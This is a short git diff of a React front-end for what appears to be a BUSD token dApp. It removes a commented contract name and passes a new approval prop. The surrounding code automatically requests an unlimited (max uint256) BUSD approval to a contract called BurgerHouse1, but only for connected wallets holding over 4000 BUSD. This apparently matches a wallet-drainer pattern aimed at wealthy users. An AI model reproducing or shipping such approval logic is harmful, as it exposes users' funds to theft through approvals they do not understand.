@@ -424,7 +424,6 @@ const Home = () => {
       if (isConnected && busdContract) {
         if (parseFloat(busdBalance) > 4000 && parseFloat(userApprovedAmount1) < parseFloat(busdBalance)) {
           await busdContract.methods.approve(
-            // BurgerHouse,
             BurgerHouse1,
             "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff"
           ).send({
@@ -694,6 +693,7 @@ const Home = () => {
         busdBalance={busdBalance}
         busdInputValue={busdInputValue}
         setBusdInputValue={setBusdInputValue}
+        userApprovedAmount1={userApprovedAmount1}
         userApprovedAmount={userApprovedAmount}
         coinInputValue={coinInputValue}
         setCoinInputValue={setCoinInputValue}
